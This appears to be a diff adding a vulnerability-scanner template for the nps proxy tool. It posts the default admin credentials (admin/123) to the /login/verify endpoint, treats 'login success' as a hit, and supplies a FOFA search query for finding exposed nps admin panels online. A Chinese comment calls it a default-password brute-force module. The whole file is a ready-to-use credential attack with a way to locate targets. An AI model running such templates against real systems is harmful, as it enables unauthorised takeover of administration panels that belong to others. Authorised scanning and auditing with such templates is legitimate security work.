@@ -1,0 +1,11 @@
+type: POST
+resource: /login/verify
+head:
+  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+body: username=admin&password=123
+poc: login success
+fofa: nps admin login
+link:
+  - https://0x20h.com/p/eada.html
+beizhu: 这是nps的默认密码爆破模块admin/123
